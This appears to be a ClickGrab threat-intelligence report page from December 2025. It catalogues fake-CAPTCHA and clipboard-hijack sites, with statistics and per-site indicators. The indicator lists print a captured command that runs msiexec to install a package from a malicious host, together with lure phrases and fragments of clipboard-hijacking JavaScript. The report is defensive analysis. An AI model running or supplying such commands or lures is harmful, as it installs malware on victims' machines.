@@ -1,0 +1,2178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickGrab Report - December 01, 2025</title>
+    <meta name="description" content="ClickGrab analyzes potential ClickFix and FakeCAPTCHA URLs from URLhaus">
+    <link rel="stylesheet" href="/ClickGrab/assets/css/styles.css">
+    <link rel="icon" href="/ClickGrab/assets/images/favicon.ico" type="image/x-icon">
+    <style>
+        .text-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FF9900;
+        }
+    </style>
+    
+<style>
+    /* Report Header */
+    .report-hero {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 3rem 2rem;
+        border-radius: 16px;
+        margin-bottom: 2rem;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .report-hero::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+        opacity: 0.3;
+    }
+    
+    .report-hero-content {
+        position: relative;
+        z-index: 1;
+    }
+    
+    .report-title {
+        font-size: 2.5rem;
+        font-weight: 700;
+        margin-bottom: 1rem;
+    }
+    
+    .report-meta {
+        display: flex;
+        gap: 2rem;
+        flex-wrap: wrap;
+        font-size: 1.1rem;
+        opacity: 0.95;
+    }
+    
+    /* Summary Cards */
+    .summary-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 1.5rem;
+        margin-bottom: 3rem;
+    }
+    
+    .summary-card {
+        background: white;
+        border-radius: 12px;
+        padding: 1.5rem;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        text-align: center;
+        transition: transform 0.3s ease;
+        border: 1px solid #e5e7eb;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .summary-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 4px;
+        background: linear-gradient(90deg, var(--gradient-start), var(--gradient-end));
+    }
+    
+    .summary-card.total { --gradient-start: #667eea; --gradient-end: #764ba2; }
+    .summary-card.threats { --gradient-start: #f093fb; --gradient-end: #f5576c; }
+    .summary-card.powershell { --gradient-start: #4facfe; --gradient-end: #00f2fe; }
+    .summary-card.clipboard { --gradient-start: #fa709a; --gradient-end: #fee140; }
+    .summary-card.score { --gradient-start: #30cfd0; --gradient-end: #330867; }
+    
+    .summary-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+    }
+    
+    .summary-icon {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+    }
+    
+    .summary-value {
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: var(--text-color);
+        margin-bottom: 0.5rem;
+    }
+    
+    .summary-label {
+        color: var(--text-light);
+        font-size: 0.9rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+    
+    .summary-change {
+        margin-top: 0.5rem;
+        font-size: 0.85rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.25rem;
+    }
+    
+    .change-up { color: #ef4444; }
+    .change-down { color: #22c55e; }
+    
+    /* Threat Overview */
+    .threat-overview {
+        background: white;
+        border-radius: 12px;
+        padding: 2rem;
+        margin-bottom: 3rem;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    
+    .threat-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 2rem;
+        flex-wrap: wrap;
+        gap: 1rem;
+    }
+    
+    .threat-title {
+        font-size: 1.75rem;
+        font-weight: 600;
+        color: var(--text-color);
+    }
+    
+    .threat-actions {
+        display: flex;
+        gap: 1rem;
+    }
+    
+    .action-btn {
+        padding: 0.5rem 1rem;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        background: white;
+        color: var(--text-color);
+        font-size: 0.9rem;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
+    
+    .action-btn:hover {
+        background: #f9fafb;
+        border-color: #667eea;
+        color: #667eea;
+    }
+
+    /* Simple bar chart styles */
+    .bars {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+        gap: 1rem;
+        margin-top: 1rem;
+    }
+    .bar {
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        padding: 0.75rem;
+    }
+    .bar-label { font-size: 0.9rem; color: var(--text-light); }
+    .bar-track { height: 10px; background: #eef2ff; border-radius: 6px; margin-top: 0.5rem; overflow: hidden; }
+    .bar-fill { height: 100%; background: linear-gradient(90deg,#667eea,#764ba2); border-radius: 6px; width: 0%; transition: width .6s ease; }
+    
+    /* Site Analysis Cards */
+    .sites-section {
+        margin-bottom: 3rem;
+    }
+    
+    .sites-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 2rem;
+    }
+    
+    .site-card {
+        background: white;
+        border-radius: 12px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+        margin-bottom: 1.5rem;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        border: 1px solid #e5e7eb;
+    }
+    
+    .site-card:hover {
+        box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+        border-color: #667eea;
+    }
+    
+    .site-header {
+        background: #f9fafb;
+        padding: 1.5rem;
+        border-bottom: 1px solid #e5e7eb;
+        cursor: pointer;
+    }
+    
+    .site-header-content {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 1rem;
+    }
+    
+    .site-url {
+        font-weight: 600;
+        color: #ef4444;
+        word-break: break-all;
+        font-family: monospace;
+        font-size: 0.95rem;
+    }
+    
+    .site-badges {
+        display: flex;
+        gap: 0.5rem;
+        flex-wrap: wrap;
+    }
+    
+    .threat-score-badge {
+        padding: 0.25rem 0.75rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 600;
+        color: white;
+    }
+    
+    .score-critical { background: #dc2626; }
+    .score-high { background: #ef4444; }
+    .score-medium { background: #f59e0b; }
+    .score-low { background: #3b82f6; }
+    
+    .attack-type-badge {
+        padding: 0.25rem 0.75rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 500;
+        background: #e0e7ff;
+        color: #4c1d95;
+    }
+    
+    .site-details {
+        display: none;
+        padding: 1.5rem;
+    }
+    
+    .site-card.expanded .site-details {
+        display: block;
+    }
+    
+    .detail-tabs {
+        display: flex;
+        gap: 1rem;
+        margin-bottom: 1.5rem;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    
+    .detail-tab {
+        padding: 0.5rem 1rem;
+        border: none;
+        background: none;
+        color: var(--text-light);
+        font-weight: 500;
+        cursor: pointer;
+        position: relative;
+        transition: color 0.2s ease;
+    }
+    
+    .detail-tab:hover {
+        color: var(--text-color);
+    }
+    
+    .detail-tab.active {
+        color: #667eea;
+    }
+    
+    .detail-tab.active::after {
+        content: '';
+        position: absolute;
+        bottom: -1px;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: #667eea;
+    }
+    
+    .tab-content {
+        display: none;
+    }
+    
+    .tab-content.active {
+        display: block;
+    }
+    
+    /* Indicator Lists */
+    .indicator-group {
+        margin-bottom: 2rem;
+    }
+    
+    .indicator-title {
+        font-size: 1.1rem;
+        font-weight: 600;
+        margin-bottom: 1rem;
+        color: var(--text-color);
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+    
+    .indicator-count {
+        background: #e0e7ff;
+        color: #4c1d95;
+        padding: 0.125rem 0.5rem;
+        border-radius: 12px;
+        font-size: 0.8rem;
+        font-weight: 500;
+    }
+    
+    .indicator-list {
+        background: #f9fafb;
+        border-radius: 8px;
+        padding: 1rem;
+        font-family: monospace;
+        font-size: 0.85rem;
+        max-height: 300px;
+        overflow-y: auto;
+    }
+    
+    .indicator-item {
+        padding: 0.5rem;
+        margin-bottom: 0.5rem;
+        background: white;
+        border-radius: 4px;
+        word-break: break-all;
+    }
+    
+    .code-block {
+        background: #1e293b;
+        color: #e2e8f0;
+        padding: 1rem;
+        border-radius: 8px;
+        overflow-x: auto;
+        font-family: monospace;
+        font-size: 0.85rem;
+        position: relative;
+        margin-bottom: 1rem;
+    }
+    
+    .copy-btn {
+        position: absolute;
+        top: 0.5rem;
+        right: 0.5rem;
+        background: rgba(255,255,255,0.1);
+        border: 1px solid rgba(255,255,255,0.2);
+        color: white;
+        padding: 0.25rem 0.75rem;
+        border-radius: 4px;
+        font-size: 0.75rem;
+        cursor: pointer;
+        transition: background 0.2s ease;
+    }
+    
+    .copy-btn:hover {
+        background: rgba(255,255,255,0.2);
+    }
+    
+    /* Analysis Section */
+    .analysis-section {
+        background: white;
+        border-radius: 12px;
+        padding: 2rem;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    
+    .analysis-content {
+        line-height: 1.8;
+        color: var(--text-color);
+    }
+    
+    .analysis-content h2 {
+        font-size: 1.5rem;
+        color: #667eea;
+        margin: 2rem 0 1rem;
+        padding-bottom: 0.5rem;
+        border-bottom: 2px solid #e0e7ff;
+    }
+    
+    .analysis-content h3 {
+        font-size: 1.25rem;
+        color: var(--text-color);
+        margin: 1.5rem 0 1rem;
+    }
+    
+    .analysis-content pre {
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        padding: 1rem;
+        overflow-x: auto;
+        margin: 1rem 0;
+    }
+    
+    .analysis-content code {
+        background: #f3f4f6;
+        padding: 0.125rem 0.25rem;
+        border-radius: 3px;
+        font-size: 0.9em;
+    }
+    
+    .analysis-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1rem 0;
+    }
+    
+    .analysis-content th,
+    .analysis-content td {
+        padding: 0.75rem;
+        text-align: left;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    
+    .analysis-content th {
+        background: #f9fafb;
+        font-weight: 600;
+    }
+    
+    .analysis-content tr:hover {
+        background: #f9fafb;
+    }
+    
+    /* Responsive */
+    @media (max-width: 768px) {
+        .report-title {
+            font-size: 1.75rem;
+        }
+        
+        .summary-grid {
+            grid-template-columns: 1fr;
+        }
+        
+        .threat-header {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        
+        .site-header-content {
+            flex-direction: column;
+            align-items: flex-start;
+        }
+    }
+    
+    /* Empty State */
+    .empty-state {
+        text-align: center;
+        padding: 3rem;
+        color: var(--text-light);
+    }
+    
+    .empty-icon {
+        font-size: 3rem;
+        margin-bottom: 1rem;
+        opacity: 0.5;
+    }
+</style>
+
+</head>
+<body>
+    <header class="site-header">
+        <div class="container">
+            <div class="logo">
+                <a href="/ClickGrab/">
+                    <img src="/ClickGrab/assets/images/logo.png" alt="ClickGrab" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+                    <span class="text-logo" style="display:none;">CLICKGRAB</span>
+                </a>
+            </div>
+            <nav class="main-nav">
+                <ul>
+                    <li><a href="/ClickGrab/" class="">Home</a></li>
+                    <li><a href="/ClickGrab/analysis.html" class="">Analysis</a></li>
+                    <li><a href="/ClickGrab/reports.html" class="active">Reports</a></li>
+                    <li><a href="/ClickGrab/techniques.html" class="">Techniques</a></li>
+                <li><a href="/ClickGrab/mitigations.html" class="">Mitigations</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main class="site-content">
+        <div class="container">
+            
+<!-- Report Header -->
+<section class="report-hero">
+    <div class="report-hero-content">
+        <h1 class="report-title">Threat Intelligence Report</h1>
+        <div class="report-meta">
+            <span>📅 December 01, 2025</span>
+            <span>🕒 Generated: 2025-12-01 03:01:52</span>
+            <span>🔍 Sites Analyzed: 20</span>
+        </div>
+    </div>
+</section>
+
+<!-- Download Section -->
+<div style="display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;">
+    <a href="https://github.com/MHaggis/ClickGrab/tree/main/nightly_reports" 
+       class="action-btn" style="text-decoration: none; background: #667eea; color: white; padding: 0.75rem 1.5rem;" target="_blank">
+        ⬇️ Download JSON Report
+    </a>
+    <a href="https://github.com/MHaggis/ClickGrab/tree/main/nightly_reports" 
+       class="action-btn" style="text-decoration: none;" target="_blank">
+        📁 View All Reports on GitHub
+    </a>
+</div>
+
+<!-- Summary Statistics -->
+<div class="summary-grid">
+    <div class="summary-card total">
+        <div class="summary-icon">🌐</div>
+        <div class="summary-value">20</div>
+        <div class="summary-label">Total Sites Analyzed</div>
+    </div>
+    
+    <div class="summary-card threats">
+        <div class="summary-icon">⚠️</div>
+        <div class="summary-value">9</div>
+        <div class="summary-label">Malicious Sites</div>
+        <div class="summary-change">
+                                        <span class="change-up">45.0% detection rate</span>
+        </div>
+    </div>
+    
+    <div class="summary-card powershell">
+        <div class="summary-icon">💻</div>
+        <div class="summary-value">11</div>
+        <div class="summary-label">PowerShell Commands</div>
+    </div>
+    
+    <div class="summary-card clipboard">
+        <div class="summary-icon">📋</div>
+        <div class="summary-value">30</div>
+        <div class="summary-label">Clipboard Hijacks</div>
+    </div>
+    
+    <div class="summary-card score">
+        <div class="summary-icon">📊</div>
+        <div class="summary-value">173</div>
+        <div class="summary-label">Avg Threat Score</div>
+    </div>
+</div>
+
+<!-- Threat Overview -->
+<section class="threat-overview">
+    <div class="threat-header">
+        <h2 class="threat-title">Attack Pattern Analysis</h2>
+        <div class="threat-actions">
+            <button class="action-btn" onclick="expandAll()">Expand All</button>
+            <button class="action-btn" onclick="collapseAll()">Collapse All</button>
+        </div>
+    </div>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem;">
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #dc2626;">8</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">High Risk Commands</div>
+        </div>
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #f59e0b;">24</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">Base64 Encoded</div>
+        </div>
+        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+            <div style="font-size: 1.5rem; font-weight: 700; color: #8b5cf6;">1</div>
+            <div style="font-size: 0.9rem; color: var(--text-light);">Obfuscated JS</div>
+        </div>
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.5rem; font-weight: 700; color: #3b82f6;">10</div>
+                            <div style="font-size: 0.9rem; color: var(--text-light);">Inline JS Redirects</div>
+                        </div>
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                        <div style="font-size: 1.5rem; font-weight: 700; color: #ec4899;">0</div>
+                            <div style="font-size: 0.9rem; color: var(--text-light);">External JS Chains</div>
+                        </div>
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.5rem; font-weight: 700; color: #22c55e;">11</div>
+                            <div style="font-size: 0.9rem; color: var(--text-light);">Redirect Follows</div>
+                        </div>
+    </div>
+
+    <!-- Aggregated indicators chart -->
+    <div class="bars" id="aggBars">
+        
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>PowerShell Commands</strong>
+                <span>11</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 37.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>Clipboard Hijacks</strong>
+                <span>30</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 100.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>Base64 Encoded</strong>
+                <span>24</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 80.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>CAPTCHA Elements</strong>
+                <span>28</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 93.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>High Risk Commands</strong>
+                <span>8</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 27.0%"></div></div>
+        </div>
+        
+        <div class="bar">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <strong>JS Redirects</strong>
+                <span>10</span>
+            </div>
+            <div class="bar-track"><div class="bar-fill" style="width: 33.0%"></div></div>
+        </div>
+        
+    </div>
+
+    
+    <div style="margin-top:2rem;">
+        <h3 style="margin:0 0 .5rem 0;">Top Indicators/Keywords</h3>
+        <div style="display:flex; gap:.5rem; flex-wrap:wrap;">
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">robot (8)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">hidden (8)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">CAPTCHA Verification (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">I am not a robot (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">Robot (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">Verification (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">verification-id (6)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">verification (5)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">To better prove you are not a robot (5)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">Verification ID (5)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">verification_id (3)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">Ray ID (3)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">Checking if you are human (3)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">Verify you are human (3)</span>
+            
+            <span style="background:#eef2ff;border:1px solid #c7d2fe;color:#1e1b4b;border-radius:999px;padding:.25rem .6rem;font-size:.85rem;">iex (2)</span>
+            
+        </div>
+    </div>
+    
+</section>
+
+<!-- Detailed Site Analysis -->
+<section class="sites-section">
+    <div class="sites-header">
+        <h2 style="font-size: 1.75rem; font-weight: 600;">Malicious Sites Detected</h2>
+        <span style="color: var(--text-light);">Click on a site to view detailed analysis</span>
+    </div>
+    
+    
+        
+        <div class="site-card" data-url="https://lollipoplaundry.com">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://lollipoplaundry.com</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            66 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 544</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijack</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-1')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-1')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-1')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-1" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">6</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">18</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-1" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">18</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">command = &#34;msiexec /i https://shift-art.com/i23/cioudfiare/verify/humanverfification/cioudfiarechaiienge/CustomerID37832738/&#34;;</div>
+                            
+                            <div class="indicator-item">exec /i https://shift-art.com/i23/cioudfiare/verify/humanverfification/cioudfiarechaiienge/CustomerID37832738/&#34;;</div>
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">verification id</div>
+                            
+                            <div class="indicator-item">Ray ID</div>
+                            
+                            <div class="indicator-item">ray id</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">5</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://i.postimg.cc/k4zrz92z/111.png</div>
+                            
+                            <div class="indicator-item">https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</div>
+                            
+                            <div class="indicator-item">https://www.google.com/s2/favicons?sz=128&amp;domain=${encodeURIComponent</div>
+                            
+                            <div class="indicator-item">https://icons.duckduckgo.com/ip3/${encodeURIComponent</div>
+                            
+                            <div class="indicator-item">https://${host}/favicon.ico`</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-1" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 2 of 6 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ea); textarea.select(); try { document.execCommand(&#39;copy&#39;); } catch(e) { /* ignore */ } document....</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ntDefault(); if (e.clipboardData) { e.clipboardData.setData(&#39;text/plain&#39;, command); } else if (window.clip...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://www.vpnkit.tech">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://www.vpnkit.tech</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            66 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 544</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijack</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-2')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-2')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-2')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-2" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">6</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">18</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">suspicious keywords</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-2" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">18</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">command = &#34;msiexec /i https://shift-art.com/i23/cioudfiare/verify/humanverfification/cioudfiarechaiienge/CustomerID37832738/&#34;;</div>
+                            
+                            <div class="indicator-item">exec /i https://shift-art.com/i23/cioudfiare/verify/humanverfification/cioudfiarechaiienge/CustomerID37832738/&#34;;</div>
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">verification id</div>
+                            
+                            <div class="indicator-item">Ray ID</div>
+                            
+                            <div class="indicator-item">ray id</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">5</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://i.postimg.cc/k4zrz92z/111.png</div>
+                            
+                            <div class="indicator-item">https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</div>
+                            
+                            <div class="indicator-item">https://www.google.com/s2/favicons?sz=128&amp;domain=${encodeURIComponent</div>
+                            
+                            <div class="indicator-item">https://icons.duckduckgo.com/ip3/${encodeURIComponent</div>
+                            
+                            <div class="indicator-item">https://${host}/favicon.ico`</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-2" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 1rem;">
+                            Showing first 2 of 6 entries (truncated for performance)
+                        </p>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ea); textarea.select(); try { document.execCommand(&#39;copy&#39;); } catch(e) { /* ignore */ } document....</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            <pre>...ntDefault(); if (e.clipboardData) { e.clipboardData.setData(&#39;text/plain&#39;, command); } else if (window.clip...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+
+                    
